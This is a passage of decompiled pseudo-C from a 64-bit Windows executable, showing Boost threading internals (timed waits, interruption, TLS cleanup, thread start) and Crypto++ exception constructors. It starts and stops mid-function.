    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
  return a2;
}

//----- (0000000140035CB0) ----------------------------------------------------
signed __int64 *__fastcall sub_140035CB0(signed __int64 *a1, __int64 *a2)
{
  __int64 v2; // r8
  signed __int64 *v3; // rbx
  signed __int64 *result; // rax
  int v5; // edx
  signed __int64 v6; // r8

  v2 = *a2;
  v3 = a1;
  if ( (*a2 - 9223372036854775806i64) & 0xFFFFFFFFFFFFFFFCui64 || v2 == -9223372036854775807i64 )
  {
    v6 = v2 % 86400000000i64;
    if ( v6 < 0 )
      v6 = -abs(v6);
    *a1 = v6;
    result = a1;
  }
  else if ( v2 == 9223372036854775806i64 )
  {
    sub_140018750(a1, 0);
    result = v3;
  }
  else if ( v2 == 0x8000000000000000i64 )
  {
    sub_140018750(a1, 1);
    result = v3;
  }
  else
  {
    v5 = 5;
    if ( v2 == 0x7FFFFFFFFFFFFFFFi64 )
      v5 = 2;
    sub_140018750(a1, v5);
    result = v3;
  }
  return result;
}

//----- (0000000140035DA0) ----------------------------------------------------
struct tm *__fastcall sub_140035DA0(const __time64_t *a1, const char *a2)
{
  struct tm *result; // rax
  __int64 (__fastcall **v3)(void *); // [rsp+28h] [rbp-20h]
  const char *v4; // [rsp+58h] [rbp+10h]

  v4 = a2;
  result = gmtime64(a1);
  if ( !result )
  {
    v4 = "could not convert calendar time to UTC time";
    std::exception::exception((std::exception *)&v3, &v4);
    v3 = &off_1400A4E20;
    sub_14002C240(&v3);
  }
  return result;
}
// 14002C240: using guessed type __int64 __fastcall sub_14002C240(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (0000000140035E00) ----------------------------------------------------
int __fastcall sub_140035E00(__int64 *a1)
{
  int result; // eax
  __int64 v2; // rbx
  HANDLE *v3; // rbx
  HANDLE v4; // rax
  HANDLE *v5; // [rsp+48h] [rbp+10h]

  result = (unsigned __int64)sub_140035C80(a1, (__int64 *)&v5);
  v2 = (__int64)v5;
  if ( v5 )
    result = SetEvent(v5[13]);
  if ( v2 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v2 + 8)) )
    {
      v3 = v5;
      (*(void (__fastcall **)(HANDLE *, _QWORD))*v5)(v5, 0i64);
      v4 = GetProcessHeap();
      result = HeapFree(v4, 0, v3);
    }
  }
  return result;
}

//----- (0000000140035E70) ----------------------------------------------------
char __fastcall sub_140035E70(void *a1, __int64 a2)
{
  __int64 v2; // rbp
  HANDLE *v3; // r14
  DWORD v4; // esi
  signed int v5; // er15
  DWORD v6; // ecx
  _BYTE *v7; // rax
  _QWORD *v8; // rax
  char *v9; // rbx
  unsigned int v10; // edi
  BOOL (__fastcall *v11)(void *, const LARGE_INTEGER *, LONG, void (__stdcall *)(LPVOID, DWORD, DWORD), void *); // r10
  HMODULE v12; // rax
  FARPROC v13; // rax
  bool v14; // r13
  char v15; // r12
  DWORD v16; // er15
  struct _FILETIME v17; // rdi
  struct _FILETIME *v18; // rax
  unsigned __int64 v19; // r9
  DWORD v20; // eax
  DWORD v21; // ecx
  char v23; // [rsp+40h] [rbp-88h]
  struct _FILETIME v24; // [rsp+48h] [rbp-80h]
  DWORD v25; // [rsp+50h] [rbp-78h]
  DWORD v26; // [rsp+54h] [rbp-74h]
  int v27; // [rsp+58h] [rbp-70h]
  char *v28; // [rsp+60h] [rbp-68h]
  char v29; // [rsp+68h] [rbp-60h]
  __int64 v30; // [rsp+70h] [rbp-58h]
  HANDLE Handles; // [rsp+78h] [rbp-50h]
  __int64 v32; // [rsp+80h] [rbp-48h]
  __int64 v33; // [rsp+88h] [rbp-40h]
  __int64 v34; // [rsp+90h] [rbp-38h]

  v30 = -2i64;
  v2 = a2;
  v3 = 0i64;
  Handles = 0i64;
  v32 = 0i64;
  v33 = 0i64;
  v34 = 0i64;
  v4 = 0;
  v27 = -1;
  v26 = -1;
  v5 = -1;
  v25 = -1;
  if ( a1 != (void *)-1i64 )
  {
    v27 = 0;
    Handles = a1;
    v4 = 1;
  }
  if ( dwTlsIndex != -1 && TlsGetValue(dwTlsIndex) )
  {
    v6 = dwTlsIndex;
    if ( dwTlsIndex == -1 )
    {
      v7 = 0i64;
    }
    else
    {
      v7 = TlsGetValue(dwTlsIndex);
      v6 = dwTlsIndex;
    }
    if ( v7[112] )
    {
      v26 = v4;
      if ( v6 == -1 )
        v8 = 0i64;
      else
        v8 = TlsGetValue(v6);
      *(&Handles + v4++) = (HANDLE)v8[13];
    }
  }
  v9 = 0i64;
  v28 = 0i64;
  if ( *(_QWORD *)(v2 + 8) != -1i64 )
  {
    sub_140036710(v2, (__int64)&v24);
    v9 = (char *)CreateWaitableTimerA(0i64, 0, 0i64);
    v28 = v9;
    if ( v9 )
    {
      v10 = 32;
      if ( v24.dwHighDateTime / 0x14 > 0x20 )
        v10 = v24.dwHighDateTime / 0x14;
      v24 = sub_140035990(v2);
      v11 = (BOOL (__fastcall *)(void *, const LARGE_INTEGER *, LONG, void (__stdcall *)(LPVOID, DWORD, DWORD), void *))qword_1400DA798;
      if ( !qword_1400DA798 )
      {
        v12 = GetModuleHandleA("KERNEL32.DLL");
        v13 = GetProcAddress(v12, "SetWaitableTimerEx");
        v11 = sub_140035150;
        if ( v13 )
          v11 = (BOOL (__fastcall *)(void *, const LARGE_INTEGER *, LONG, void (__stdcall *)(LPVOID, DWORD, DWORD), void *))v13;
        qword_1400DA798 = (__int64)v11;
      }
      if ( ((unsigned int (__fastcall *)(char *, struct _FILETIME *, _QWORD, _QWORD, _QWORD, void *, unsigned int))v11)(
             v9,
             &v24,
             0i64,
             0i64,
             0i64,
             &unk_1400D8050,
             v10) != 0 )
      {
        v5 = v4;
        v25 = v4;
        *(&Handles + v4++) = v9;
      }
    }
  }
  v14 = v5 != -1;
  v15 = 0;
  LOBYTE(v24.dwLowDateTime) = 0;
  v16 = 0;
  v24.dwHighDateTime = 0;
  v17 = (struct _FILETIME)v24.dwLowDateTime;
  while ( 1 )
  {
    if ( !v14 )
    {
      v18 = (struct _FILETIME *)sub_140036710(v2, (__int64)&v29);
      v17 = *v18;
      v24 = *v18;
      v16 = v24.dwHighDateTime;
      v15 = v24.dwLowDateTime;
    }
    if ( !v4 )
    {
      if ( v16 )
        v21 = v16;
      else
        v21 = 0;
      Sleep(v21);
      goto LABEL_38;
    }
    v19 = *(unsigned __int64 *)&v17 >> 32;
    if ( v14 )
      LODWORD(v19) = -1;
    v20 = WaitForMultipleObjectsEx(v4, &Handles, 0, v19, 0);
    if ( v20 >= v4 )
      goto LABEL_38;
    if ( v20 == v27 )
      break;
    if ( v20 == v26 )
    {
      if ( dwTlsIndex != -1 )
        v3 = (HANDLE *)TlsGetValue(dwTlsIndex);
      ResetEvent(v3[13]);
      v23 = 0;
      CxxThrowException(&v23, &_TI1_AVthread_interrupted_boost__);
    }
    if ( v20 == v25 )
    {
LABEL_49:
      if ( (unsigned __int64)(v9 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
        CloseHandle(v9);
      return 0;
    }
LABEL_38:
    if ( *(_BYTE *)(v2 + 16) )
      *(_QWORD *)(v2 + 8) -= 4294967294i64;
    if ( !v15 )
      goto LABEL_49;
  }
  if ( (unsigned __int64)(v9 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
    CloseHandle(v9);
  return 1;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3F08: using guessed type int _TI1_AVthread_interrupted_boost__;
// 1400DA798: using guessed type __int64 qword_1400DA798;

//----- (0000000140036180) ----------------------------------------------------
bool sub_140036180()
{
  HANDLE *v0; // rax
  bool result; // al

  result = 0;
  if ( dwTlsIndex != -1 && TlsGetValue(dwTlsIndex) )
  {
    v0 = (HANDLE *)(dwTlsIndex == -1 ? 0i64 : TlsGetValue(dwTlsIndex));
    if ( !WaitForSingleObjectEx(v0[13], 0, 0) )
      result = 1;
  }
  return result;
}

//----- (00000001400361D0) ----------------------------------------------------
__int64 __fastcall sub_1400361D0(__int64 *a1)
{
  LPVOID *v1; // rsi
  volatile signed __int32 *v2; // rbx
  __int128 v3; // ST28_16
  void *v4; // rax
  volatile signed __int32 *v5; // rax
  void *v6; // rbx
  HANDLE v7; // rax
  unsigned __int8 v8; // si
  void *v9; // rbx
  HANDLE v10; // rax
  __int128 v12; // [rsp+38h] [rbp-40h]
  __int128 v13; // [rsp+50h] [rbp-28h]
  __int128 v14; // [rsp+60h] [rbp-18h]
  LPVOID v15; // [rsp+88h] [rbp+10h]
  LPVOID lpMem; // [rsp+90h] [rbp+18h]

  v1 = (LPVOID *)a1;
  sub_140035C80(a1, (__int64 *)&v15);
  v2 = (volatile signed __int32 *)v15;
  if ( v15 )
  {
    *(_QWORD *)&v3 = 0i64;
    *((_QWORD *)&v3 + 1) = -1i64;
    LOBYTE(v12) = 1;
    *((_QWORD *)&v12 + 1) = 9223372036854775806i64;
    v13 = v3;
    v14 = v12;
    v4 = (void *)sub_1400364F0(v1);
    sub_140035E70(v4, (__int64)&v13);
    lpMem = *v1;
    v5 = (volatile signed __int32 *)lpMem;
    *v1 = 0i64;
    if ( v5 )
    {
      if ( !_InterlockedDecrement(v5 + 2) )
      {
        v6 = lpMem;
        (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
        v7 = GetProcessHeap();
        HeapFree(v7, 0, v6);
      }
      v2 = (volatile signed __int32 *)v15;
    }
    v8 = 1;
  }
  else
  {
    v8 = 0;
  }
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    v9 = v15;
    (**(void (__fastcall ***)(LPVOID, _QWORD))v15)(v15, 0i64);
    v10 = GetProcessHeap();
    HeapFree(v10, 0, v9);
  }
  return v8;
}
// 1400364F0: using guessed type __int64 __fastcall sub_1400364F0(_QWORD);

//----- (00000001400362F0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400362F0(__int64 *a1)
{
  bool v1; // di
  void *v2; // rbx
  HANDLE v3; // rax
  LPVOID lpMem; // [rsp+48h] [rbp+10h]

  sub_140035C80(a1, (__int64 *)&lpMem);
  v1 = lpMem != 0i64;
  if ( lpMem && !_InterlockedDecrement((volatile signed __int32 *)lpMem + 2) )
  {
    v2 = lpMem;
    (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
    v3 = GetProcessHeap();
    HeapFree(v3, 0, v2);
  }
  return v1;
}

//----- (0000000140036360) ----------------------------------------------------
signed int __fastcall sub_140036360(__int64 a1)
{
  __int64 v1; // rdi
  signed int result; // eax
  _QWORD *v3; // rdi
  _QWORD *i; // rbx
  signed int v5; // ecx
  HANDLE v6; // rax
  volatile signed __int32 *v7; // [rsp+28h] [rbp-20h]
  char v8; // [rsp+30h] [rbp-18h]

  v1 = a1;
  v7 = (volatile signed __int32 *)(a1 + 64);
  v8 = 0;
  sub_14001D2E0(&v7);
  *(_BYTE *)(v1 + 40) = 1;
  result = sub_140036570(v1 + 80);
  v3 = *(_QWORD **)(v1 + 136);
  for ( i = (_QWORD *)*v3; i != v3; i = (_QWORD *)*i )
    result = sub_140036570(i[2]);
  if ( v8 )
  {
    result = (signed int)v7;
    v5 = _InterlockedExchangeAdd(v7, 0x80000000);
    if ( !_bittest(&v5, 0x1Eu) && v5 > (signed int)2147483648 )
    {
      result = (signed int)v7;
      if ( !_interlockedbittestandset(v7, 0x1Eu) )
      {
        v6 = sub_1400139E0((__int64)v7);
        result = SetEvent(v6);
      }
    }
  }
  return result;
}

//----- (0000000140036410) ----------------------------------------------------
char __fastcall sub_140036410(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  _BYTE *v3; // rbx
  _BYTE *v4; // rdx
  unsigned int v5; // ecx
  __int64 v6; // rax
  DWORD v7; // eax
  DWORD v8; // edx
  char result; // al

  v2 = a2;
  v3 = (_BYTE *)a1;
  v4 = (_BYTE *)(a1 + 54);
  *(_OWORD *)a1 = xmmword_1400A81C0;
  *(_OWORD *)(a1 + 16) = xmmword_1400A81D0;
  *(_OWORD *)(a1 + 32) = xmmword_1400A81E0;
  *(_DWORD *)(a1 + 48) = 1818635621;
  *(_WORD *)(a1 + 52) = 26465;
  *(_BYTE *)(a1 + 54) = 0;
  v5 = 0;
  do
  {
    ++v4;
    v6 = v2 >> v5;
    v5 += 4;
    *(v4 - 1) = (v6 & 0xF) + 65;
  }
  while ( v5 < 0x40 );
  *v4 = 0;
  v7 = GetCurrentProcessId();
  v3[70] = (v7 & 0xF) + 65;
  v3[71] = ((v7 >> 4) & 0xF) + 65;
  v3[73] = ((v7 >> 12) & 0xF) + 65;
  v3[72] = (BYTE1(v7) & 0xF) + 65;
  v3[74] = (BYTE2(v7) & 0xF) + 65;
  v3[75] = ((v7 >> 20) & 0xF) + 65;
  v8 = v7 >> 28;
  result = (HIBYTE(v7) & 0xF) + 65;
  v3[77] = (v8 & 0xF) + 65;
  v3[76] = result;
  v3[78] = 0;
  return result;
}
// 1400A81C0: using guessed type __int128 xmmword_1400A81C0;
// 1400A81D0: using guessed type __int128 xmmword_1400A81D0;
// 1400A81E0: using guessed type __int128 xmmword_1400A81E0;

//----- (0000000140036570) ----------------------------------------------------
signed int __fastcall sub_140036570(__int64 a1)
{
  __int64 v1; // rsi
  signed int result; // eax
  LONG v3; // edx
  __int64 *v4; // rbx
  __int64 *i; // rdi
  __int64 v6; // rcx
  LONG v7; // edx
  char *v8; // rcx
  HANDLE v9; // rax

  v1 = a1;
  result = *(_DWORD *)(a1 + 16);
  if ( result )
  {
    sub_14001D400((volatile signed __int32 *)a1);
    v3 = *(_DWORD *)(v1 + 16);
    if ( v3 )
    {
      *(_DWORD *)(v1 + 16) = 0;
      ReleaseSemaphore(*(HANDLE *)(v1 + 48), v3, 0i64);
      v4 = *(__int64 **)(v1 + 24);
      for ( i = *(__int64 **)(v1 + 32); v4 != i; ++v4 )
      {
        v6 = *v4;
        v7 = *(_DWORD *)(*v4 + 16);
        *(_BYTE *)(v6 + 20) = 1;
        ReleaseSemaphore(*(HANDLE *)v6, v7, 0i64);
      }
      sub_14001BE70(v1 + 24, *(__int64 **)(v1 + 24), *(__int64 **)(v1 + 32));
      *(_QWORD *)(v1 + 32) = *(_QWORD *)(v1 + 24);
      v8 = *(char **)(v1 + 48);
      if ( (unsigned __int64)(v8 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
        CloseHandle(v8);
      *(_QWORD *)(v1 + 48) = 0i64;
    }
    result = _InterlockedExchangeAdd((volatile signed __int32 *)v1, 0x80000000);
    if ( !_bittest(&result, 0x1Eu)
      && result > (signed int)2147483648
      && !_interlockedbittestandset((volatile signed __int32 *)v1, 0x1Eu) )
    {
      v9 = sub_1400139E0(v1);
      result = SetEvent(v9);
    }
  }
  return result;
}

//----- (0000000140036670) ----------------------------------------------------
BOOL sub_140036670()
{
  BOOL result; // eax

  if ( dwTlsIndex != -1 )
  {
    result = TlsFree(dwTlsIndex);
    dwTlsIndex = -1;
  }
  return result;
}

//----- (00000001400366B0) ----------------------------------------------------
int __fastcall sub_1400366B0(volatile signed __int32 **a1)
{
  volatile signed __int32 *v1; // rax
  HANDLE v2; // rax
  volatile signed __int32 *v4; // [rsp+30h] [rbp+8h]

  v1 = *a1;
  *a1 = 0i64;
  v4 = v1;
  if ( v1 && !_InterlockedDecrement(v1 + 2) )
  {
    (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v1)(v1, 0i64);
    v2 = GetProcessHeap();
    LODWORD(v1) = HeapFree(v2, 0, (LPVOID)v4);
  }
  return (signed int)v1;
}

//----- (0000000140036710) ----------------------------------------------------
__int64 __fastcall sub_140036710(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  __int64 result; // rax
  signed __int64 (*v5)(); // rcx
  HMODULE v6; // rax
  FARPROC v7; // rax
  __int64 v8; // rax
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rdx
  __int64 v13; // [rsp+30h] [rbp+8h]
  __int64 v14; // [rsp+40h] [rbp+18h]

  v2 = a2;
  v3 = (_QWORD *)a1;
  if ( *(_QWORD *)(a1 + 8) == -1i64 )
  {
    *(_BYTE *)a2 = 1;
    result = a2;
    *(_DWORD *)(a2 + 4) = -2;
    return result;
  }
  if ( *(_BYTE *)(a1 + 16) )
  {
    v5 = (signed __int64 (*)())qword_1400D9E50;
    if ( !qword_1400D9E50 )
    {
      v6 = GetModuleHandleA("KERNEL32.DLL");
      v7 = GetProcAddress(v6, "GetTickCount64");
      v5 = sub_14001A620;
      if ( v7 )
        v5 = v7;
      qword_1400D9E50 = (__int64)v5;
    }
    v8 = v5();
    v9 = v3[1];
    v10 = v8 - *v3;
    if ( v10 >= v9 )
      v11 = 0i64;
    else
      v11 = v9 - v10;
  }
  else
  {
    sub_1400353B0(&v13, sub_140035DA0);
    if ( v13 >= v3[3] )
    {
      *(_BYTE *)v2 = 0;
      result = v2;
      *(_DWORD *)(v2 + 4) = 0;
      return result;
    }
    sub_14002CE00(&v14, v3 + 3, &v13);
    v12 = (signed __int64)((unsigned __int128)(v14 * (signed __int128)2361183241434822607i64) >> 64) >> 7;
    v11 = v12 + 1 + (v12 >> 63);
  }
  *(_BYTE *)v2 = v11 > 0xFFFFFFFE;
  result = v2;
  if ( v11 > 0xFFFFFFFE )
    LODWORD(v11) = -2;
  *(_DWORD *)(v2 + 4) = v11;
  return result;
}
// 1400353B0: using guessed type __int64 __fastcall sub_1400353B0(_QWORD, _QWORD);
// 1400D9E50: using guessed type __int64 qword_1400D9E50;

//----- (0000000140036830) ----------------------------------------------------
void sub_140036830()
{
  volatile signed __int32 *v0; // rsi
  _QWORD *v1; // rbx
  void *v2; // rdi
  HANDLE v3; // rax
  HANDLE v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rcx
  HANDLE v7; // rax
  char v8; // [rsp+48h] [rbp+10h]

  if ( dwTlsIndex == -1 )
    v0 = 0i64;
  else
    v0 = (volatile signed __int32 *)TlsGetValue(dwTlsIndex);
  if ( !v0 )
    goto LABEL_20;
  while ( 1 )
  {
    v1 = (_QWORD *)*((_QWORD *)v0 + 3);
    if ( *((_QWORD *)v0 + 6) )
    {
      if ( !v1 )
        goto LABEL_12;
      goto LABEL_9;
    }
    if ( !v1 )
      break;
    do
    {
LABEL_9:
      *((_QWORD *)v0 + 3) = v1[1];
      if ( *v1 )
      {
        (*(void (__cdecl **)(_QWORD))(*(_QWORD *)*v1 + 8i64))(*v1);
        v2 = (void *)*v1;
        (**(void (__fastcall ***)(_QWORD, _QWORD))*v1)(*v1, 0i64);
        v3 = GetProcessHeap();
        HeapFree(v3, 0, v2);
      }
      v4 = GetProcessHeap();
      HeapFree(v4, 0, v1);
      v1 = (_QWORD *)*((_QWORD *)v0 + 3);
    }
    while ( v1 );
LABEL_12:
    while ( *((_QWORD *)v0 + 6) )
    {
      v5 = **((_QWORD **)v0 + 5);
      v6 = *(_QWORD *)(v5 + 40);
      if ( v6 )
      {
        if ( *(_QWORD *)(v5 + 56) )
          (*(void (__cdecl **)(__int64))(*(_QWORD *)v6 + 8i64))(v6);
      }
      sub_14001CBD0((__int64 **)v0 + 5, (__int64 *)&v8, v5);
    }
  }
  sub_140035160((volatile signed __int32 *)&unk_1400DA780, (void (__cdecl *)(__int64))sub_140035390);
  if ( dwTlsIndex != -1 )
    TlsSetValue(dwTlsIndex, 0i64);
LABEL_20:
  if ( v0 && !_InterlockedDecrement(v0 + 2) )
  {
    (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v0)(v0, 0i64);
    v7 = GetProcessHeap();
    HeapFree(v7, 0, (LPVOID)v0);
  }
}

//----- (0000000140036990) ----------------------------------------------------
char __fastcall sub_140036990(void **a1)
{
  void **v1; // rdi
  uintptr_t v2; // rax
  uintptr_t v3; // rsi
  _QWORD *v4; // rbx
  char *v5; // rcx

  v1 = a1;
  v2 = beginthreadex(0i64, 0, StartAddress, *a1, 4u, (unsigned int *)*a1 + 8);
  v3 = v2;
  if ( v2 )
  {
    _InterlockedIncrement((volatile signed __int32 *)*v1 + 2);
    v4 = *v1;
    v5 = (char *)*((_QWORD *)*v1 + 2);
    if ( (unsigned __int64)(v5 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
      CloseHandle(v5);
    v4[2] = v3;
    ResumeThread(*((HANDLE *)*v1 + 2));
    LOBYTE(v2) = 1;
  }
  return v2;
}

//----- (0000000140036A80) ----------------------------------------------------
void sub_140036A80()
{
  Sleep(0);
}

//----- (0000000140036A90) ----------------------------------------------------
__int64 sub_140036A90()
{
  return 0i64;
}

//----- (0000000140036AA0) ----------------------------------------------------
__int64 sub_140036AA0()
{
  __int64 v0; // rcx

  atexit(sub_1400366A0);
  nullsub_1(v0);
  return 0i64;
}
// 140095790: using guessed type __int64 __fastcall nullsub_1(_QWORD);

//----- (0000000140036AC0) ----------------------------------------------------
__int64 sub_140036AC0()
{
  sub_140036670();
  return 0i64;
}

//----- (0000000140036AD0) ----------------------------------------------------
void __fastcall TlsCallback_0(__int64 a1, int a2)
{
  JUMPOUT(a2, 3, sub_1400366A0);
}

//----- (0000000140036AE0) ----------------------------------------------------
signed __int64 __fastcall sub_140036AE0(__int64 a1, int a2)
{
  if ( a2 )
  {
    if ( a2 == 3 )
      sub_1400366A0();
  }
  else
  {
    sub_140036670();
  }
  return 1i64;
}

//----- (0000000140036B50) ----------------------------------------------------
__int64 __fastcall sub_140036B50(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  char v4; // bp
  __int64 v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x50ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400A8928;
    sub_1400370B0((__int64)(v8 + 4), v5);
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400A8928: using guessed type __int64 (__fastcall *off_1400A8928)(void *);

//----- (0000000140036C20) ----------------------------------------------------
__int64 __fastcall sub_140036C20(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  char v4; // bl
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_140036B50(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (0000000140036CB0) ----------------------------------------------------
_QWORD *__fastcall sub_140036CB0(_QWORD *a1, __int64 a2, __int64 a3)
{
  *a1 = &off_1400A8940;
  a1[1] = off_1400A9A98;
  a1[3] = a2;
  a1[4] = a3;
  a1[5] = 0i64;
  return a1;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140036CF0) ----------------------------------------------------
std::exception *__fastcall sub_140036CF0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140023660(a1, a2);
  *(_QWORD *)v2 = &off_1400A8798;
  return v2;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140036D20) ----------------------------------------------------
std::exception *__fastcall sub_140036D20(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140036DA0) ----------------------------------------------------
__int64 __fastcall sub_140036DA0(__int64 a1, char a2)
{
  __int64 v2; // rbx
  char v4; // [rsp+28h] [rbp-21h]
  __int64 v5; // [rsp+38h] [rbp-11h]
  __int64 v6; // [rsp+40h] [rbp-9h]
  __int64 (__fastcall **v7)(void *); // [rsp+50h] [rbp+7h]
  int v8; // [rsp+68h] [rbp+1Fh]
  char Dst; // [rsp+70h] [rbp+27h]
  __int64 v10; // [rsp+80h] [rbp+37h]
  __int64 v11; // [rsp+88h] [rbp+3Fh]

  v2 = a1;
  if ( a2 && sub_140050CE0() )
  {
    if ( !(unsigned int)sub_140053F50() && !sub_140050CE0() )
    {
      v6 = 15i64;
      v5 = 0i64;
      v4 = 0;
      sub_140004F20(&v4, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v7);
      v7 = &off_1400A8798;
      v8 = 6;
      v11 = 15i64;
      v10 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v7 = &off_1400A8798;
      CxxThrowException(&v7, &_TI3_AVcls_079_CryptoPP__);
    }
    if ( (unsigned int)sub_140053F50() == 1 )
    {
      v6 = 15i64;
      v5 = 0i64;
      v4 = 0;
      sub_140004F20(&v4, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v7);
      v7 = &off_1400A8798;
      v8 = 6;
      v11 = 15i64;
      v10 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v7 = &off_1400A8798;
      CxxThrowException(&v7, &_TI3_AVcls_079_CryptoPP__);
    }
  }
  return v2;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3CD8: using guessed type int _TI3_AVcls_079_CryptoPP__;

//----- (0000000140036F30) ----------------------------------------------------
std::exception *__fastcall sub_140036F30(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140023560(a1, a2);
  *(_QWORD *)v2 = &off_1400A8798;
  return v2;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140036F60) ----------------------------------------------------
std::exception *__fastcall sub_140036F60(std::exception *a1, _QWORD *a2, unsigned __int64 a3)
{
  _QWORD *v3; // rdi
  std::exception *v4; // rsi
  size_t *v5; // rbx
  size_t *v6; // rax
  _QWORD *v7; // rax
  _QWORD *v8; // rax
  void *v10; // [rsp+28h] [rbp-A0h]
  __int64 v11; // [rsp+38h] [rbp-90h]
  unsigned __int64 v12; // [rsp+40h] [rbp-88h]
  void *Src; // [rsp+48h] [rbp-80h]
  __int64 v14; // [rsp+58h] [rbp-70h]
  unsigned __int64 v15; // [rsp+60h] [rbp-68h]
  void *v16; // [rsp+68h] [rbp-60h]
  __int64 v17; // [rsp+78h] [rbp-50h]
  unsigned __int64 v18; // [rsp+80h] [rbp-48h]
  void *Dst; // [rsp+88h] [rbp-40h]
  unsigned __int64 v20; // [rsp+A0h] [rbp-28h]

  v3 = a2;
  v4 = a1;
  v5 = sub_14003AF30(&Dst, a3, 0xAu);
  v6 = sub_14000DB10(&Src, v3, ": ");
  v7 = sub_14001DE70(&v10, v6, v5);
  v8 = sub_14000DAC0(&v16, v7, " is not a valid key length");
  sub_1400235E0(v4, v8);
  if ( v18 >= 0x10 )
    operator delete(v16);
  v18 = 15i64;
  v17 = 0i64;
  LOBYTE(v16) = 0;
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v15 >= 0x10 )
    operator delete(Src);
  v15 = 15i64;
  v14 = 0i64;
  LOBYTE(Src) = 0;
  if ( v20 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v4 = &off_1400A8798;
  return v4;
}
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (00000001400370B0) ----------------------------------------------------
__int64 __fastcall sub_1400370B0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  size_t v4; // rsi
  void *v5; // rax
  const void *v6; // r8

  v2 = a1;
  v3 = a2;
  *(_BYTE *)a1 = *(_BYTE *)a2;
